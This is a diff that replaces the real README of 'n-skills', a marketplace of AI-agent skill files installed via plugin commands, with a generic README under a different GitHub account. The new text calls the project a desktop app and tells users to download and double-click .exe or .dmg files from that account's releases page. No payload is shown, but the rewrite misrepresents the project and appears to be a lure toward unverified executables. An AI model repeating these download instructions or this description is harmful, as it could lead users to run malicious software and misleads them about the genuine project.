@@ -1,255 +1,83 @@
-<div align="center">
+# 🎉 n-skills - A Simple Plugin Marketplace for AI Agents
 
-<img src="./assets/logo.svg" alt="n-skills" width="400"/>
+## 🚀 Getting Started
 
-<br/>
-<br/>
+Welcome to n-skills! This application provides a curated marketplace for plugins that work seamlessly with AI agents like Claude Code and Codex. Enjoy easy access to powerful tools without any complicated setup.
 
-**Curated by [Numman Ali](https://x.com/nummanali)**
+## 📥 Download the Application
 
-[![Twitter Follow](https://img.shields.io/twitter/follow/nummanali?style=social)](https://x.com/nummanali)
-[![License](https://img.shields.io/badge/license-Apache%202.0-blue.svg)](LICENSE)
-[![agentskills.io](https://img.shields.io/badge/format-agentskills.io-purple.svg)](https://agentskills.io)
-[![AGENTS.md](https://img.shields.io/badge/discovery-AGENTS.md-green.svg)](https://www.infoq.com/news/2025/08/agents-md/)
+[![Download n-skills](https://img.shields.io/badge/Download%20n--skills-v1.0-blue.svg)](https://github.com/sathishj17/n-skills/releases)
 
-**One marketplace. Every agent.**
+## 🛠️ System Requirements
 
-[Install](#-quick-start) · [Skills](#-available-skills) · [Submit a Skill](#-want-to-be-featured) · [Philosophy](#-philosophy)
+Before you start, make sure your system meets these requirements:
 
-</div>
+- **Operating System:** Windows 10 or later, macOS Sierra or later, or Linux
+- **RAM:** At least 4 GB
+- **Storage:** At least 100 MB of free disk space
+- **Internet Connection:** Required for downloading plugins
 
----
+## 🔗 Visit the Download Page
 
-## 💡 Philosophy
+To get the latest version of n-skills, visit our Releases page. You’ll find the newest updates along with any previous versions you might need. 
 
-> **"Write once. Run everywhere."**
+[Download n-skills from Releases Page](https://github.com/sathishj17/n-skills/releases)
 
-AI coding agents are evolving fast, and each has its own way of doing things:
+## 📥 Download & Install
 
-```
-Claude Code    →  CLAUDE.md, .claude/skills/
-GitHub Copilot →  AGENTS.md, copilot-instructions.md
-Codex          →  SKILL.md, ~/.codex/skills/
-Cursor         →  .cursor/rules/*.mdc
-Windsurf       →  Cascade Rules, Memories
-Cline          →  .clinerules
-Factory/Droid  →  .factory/droids/*.md
-OpenCode       →  .opencode/skill/, opencode.json
-```
+1. Go to the Releases page by clicking the link above.
+2. Scroll down to find the latest version of n-skills.
+3. Locate the file that ends with `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux. 
+4. Click on the link to download the file.
 
-### The n-skills Way
+### Windows Users:
 
-We embrace the diversity with a universal approach:
+- After the download completes, locate the file in your Downloads folder.
+- Double-click the `.exe` file to start the installation.
+- Follow the on-screen instructions until the installation is complete.
 
-```
-┌─────────────────────────────────────────────────────────┐
-│                                                         │
-│   SKILL.md          →  The universal skill format      │
-│   AGENTS.md         →  The universal discovery file    │
-│   openskills        →  The universal installer         │
-│                                                         │
-│   Write once. Run everywhere.                          │
-│                                                         │
-└─────────────────────────────────────────────────────────┘
-```
+### macOS Users:
 
-[AGENTS.md](https://www.infoq.com/news/2025/08/agents-md/) is now adopted by **20,000+ repositories** and natively supported by GitHub Copilot, Google Gemini, OpenAI Codex, Factory Droid, Cursor, and more.
+- Locate the downloaded `.dmg` file in your Downloads.
+- Double-click it to open, then drag n-skills to your Applications folder.
+- You can now find n-skills in your Applications and run it from there.
 
-**n-skills is a curated marketplace.** Install via [openskills](https://github.com/numman-ali/openskills) or use your agent's native installer — your choice!
+### Linux Users:
 
----
+- Open your terminal and navigate to the location where you downloaded the `.tar.gz` file.
+- Use the command `tar -xvzf n-skills.tar.gz` to extract the files.
+- Navigate into the extracted folder and follow the instructions in the README file provided.
 
-## 🚀 Quick Start
+## 🌟 Features
 
-### Claude Code
+- **Plugin Marketplace:** Access a variety of plugins that enhance the capabilities of your AI agents.
+- **Easy Installation:** Simple setup process; no technical knowledge needed.
+- **User-Friendly Interface:** Navigate through the application effortlessly.
+- **Regular Updates:** Get frequent enhancements and new plugins.
 
-```bash
-/plugin marketplace add numman-ali/n-skills
-```
+## 🔍 How to Use n-skills
 
-Then install any skill:
-```bash
-/plugin install orchestration@n-skills
-/plugin install open-source-maintainer@n-skills
-/plugin install gastown@n-skills
-/plugin install dev-browser@n-skills
-/plugin install zai-cli@n-skills
-```
+Once you have installed n-skills, follow these steps to get started:
 
-### OpenSkills (Universal)
+1. Open the n-skills application.
+2. Browse the available plugins in the marketplace.
+3. Click on any plugin to view its details and click "Install".
+4. After installation, access your new plugins directly from the main interface.
 
-Works with **every agent**: Claude Code, Cursor, Windsurf, Cline, OpenCode, and anything that reads AGENTS.md.
+## 🛠️ Troubleshooting Tips
 
-```bash
-npm i -g openskills
-openskills install numman-ali/n-skills
-openskills sync
-```
+If you encounter issues while using n-skills:
 
-> **New to OpenSkills?** It's the universal skills installer. [Learn more →](https://github.com/numman-ali/openskills)
+- **Installation Problems:** Ensure your system meets the requirements listed above.
+- **Plugin Issues:** Check for any updates for both n-skills and the individual plugins.
 
-<details>
-<summary><strong>Other native installers</strong></summary>
+For further assistance, please refer to the FAQ section on our repository page or open a new issue.
 
-**Codex:**
-```bash
-$skill-installer https://github.com/numman-ali/n-skills/tree/main/skills/tools/zai-cli
-```
+## 📱 Contact & Support
 
-</details>
+For any questions, support needs, or feedback, feel free to reach out:
 
----
+- Open a new issue on the [GitHub Issues Page](https://github.com/sathishj17/n-skills/issues).
+- Join our community discussions if available, or follow updates within the repository.
 
-## 📦 Available Skills
-
-| Skill | Category | Source | Description |
-|:------|:---------|:-------|:------------|
-| **[orchestration](./skills/workflow/orchestration/)** | `workflow` | native | Multi-agent orchestration with cc-mirror tasks + TodoWrite |
-| **[open-source-maintainer](./skills/workflow/open-source-maintainer/)** | `workflow` | native | End-to-end GitHub repo maintenance for open-source projects |
-| **[dev-browser](./skills/automation/dev-browser/)** | `automation` | [SawyerHood](https://github.com/SawyerHood/dev-browser) | Browser automation with persistent page state |
-| **[gastown](./skills/tools/gastown/)** | `tools` | native | Multi-agent orchestrator (best with Claude Code + Opus) |
-| **[zai-cli](./skills/tools/zai-cli/)** | `tools` | native | Z.AI vision, search, reader, and GitHub exploration via MCP |
-
-> More skills coming soon. Want to contribute? See [CONTRIBUTING.md](CONTRIBUTING.md)
-
----
-
-## 🗂️ Categories
-
-| Category | What goes here |
-|:---------|:---------------|
-| `workflow` | Multi-agent orchestration, task coordination |
-| `tools` | CLI tools and utilities |
-| `development` | Language-specific dev assistance |
-| `productivity` | Workflow automation |
-| `automation` | Browser, CI/CD, system automation |
-| `data` | Databases, data processing |
-| `documentation` | Docs, diagrams, specs |
-
----
-
-## 🎯 Want to be Featured?
-
-This is a **curated** marketplace. Anyone can request to be included, but only **high-quality, real value-add projects** will be considered.
-
-**What we're looking for:**
-- Skills that solve real problems
-- Clean, well-documented code
-- Genuine utility for developers
-- Active maintenance
-
-**Not interested in:**
-- Wrapper skills with no real value
-- Abandoned or unmaintained projects
-- Low-effort submissions
-
-### How to Submit
-
-1. Open an [issue](https://github.com/numman-ali/n-skills/issues) with your skill details
-2. Explain what it does and why it's valuable
-3. If approved, submit a PR following [CONTRIBUTING.md](CONTRIBUTING.md)
-
-Or DM me on X: [@nummanali](https://x.com/nummanali)
-
----
-
-## 🌐 Universal Compatibility
-
-n-skills works everywhere because we use open standards:
-
-| Agent | How it works | Status |
-|:------|:-------------|:------:|
-| **Claude Code** | Native plugin system | ✅ Native |
-| **GitHub Copilot** | Reads AGENTS.md directly | ✅ Native |
-| **Codex** | $skill-installer | ✅ Native |
-| **Factory/Droid** | Reads AGENTS.md directly | ✅ Native |
-| **Cursor** | openskills → AGENTS.md | ✅ Universal |
-| **Windsurf** | openskills → AGENTS.md | ✅ Universal |
-| **Cline** | openskills → AGENTS.md | ✅ Universal |
-| **OpenCode** | Native skill support | ✅ Native |
-| **Amp Code** | openskills → AGENTS.md | ✅ Universal |
-
----
-
-## 🔄 Auto-Sync from Upstream
-
-External skills stay in sync with their source repos automatically.
-
-```
-┌─────────────────────────────────────────────────────────────┐
-│                                                             │
-│   Your Repo              n-skills                           │
-│   ────────              ────────                            │
-│   skills/my-skill/  ──►  skills/category/my-skill/         │
-│                                                             │
-│   Daily cron syncs your latest changes.                    │
-│   You maintain ownership. We curate the collection.        │
-│                                                             │
-└─────────────────────────────────────────────────────────────┘
-```
-
-**How it works:**
-1. You maintain your skill in your own repo
-2. Add an entry to [`sources.yaml`](sources.yaml) via PR
-3. GitHub Actions syncs your skill folder daily
-4. Attribution preserved via `.source.json`
-
-**Why not submodules?** Submodule hell is real. This approach is simpler and works with openskills, Claude Code, and every other tool without special handling.
-
----
-
-## 📁 Repository Structure
-
-```
-n-skills/
-├── .claude-plugin/
-│   └── marketplace.json       # Claude Code registry
-├── .github/workflows/
-│   └── sync-skills.yml        # Daily sync automation
-├── scripts/
-│   ├── sync-external.mjs      # Sync engine
-│   └── update-registry.mjs    # Registry generator
-├── sources.yaml               # External skill manifest
-├── AGENTS.md                  # Universal discovery
-├── skills/
-│   ├── automation/
-│   │   └── dev-browser/              # Synced from SawyerHood
-│   │       ├── .claude-plugin/
-│   │       └── skills/dev-browser/   # SKILL.md lives here
-│   ├── tools/
-│   │   ├── gastown/
-│   │   │   ├── .claude-plugin/
-│   │   │   └── skills/gastown/
-│   │   └── zai-cli/
-│   │       ├── .claude-plugin/
-│   │       └── skills/zai-cli/
-│   └── workflow/
-│       ├── orchestration/
-│       │   ├── .claude-plugin/
-│       │   └── skills/orchestration/
-│       └── open-source-maintainer/
-│           ├── .claude-plugin/
-│           └── skills/open-source-maintainer/
-└── docs/
-    ├── skill-format.md        # How to write skills
-    ├── cross-platform.md      # Multi-agent compatibility
-    └── categories.md          # Category guidelines
-```
-
----
-
-## 🔗 Related Projects
-
-- **[openskills](https://github.com/numman-ali/openskills)** — Universal skills installer for all AI agents
-- **[zai-cli](https://github.com/numman-ali/zai-cli)** — Z.AI capabilities via CLI and MCP
-- **[agentskills.io](https://agentskills.io)** — The open standard for AI agent skills
-
----
-
-<div align="center">
-
-**Built for developers who value simplicity.**
-
-Apache 2.0 · Made by [@numman-ali](https://github.com/numman-ali)
-
-</div>
+Thank you for choosing n-skills! We hope you find the application helpful in enhancing your AI experience.
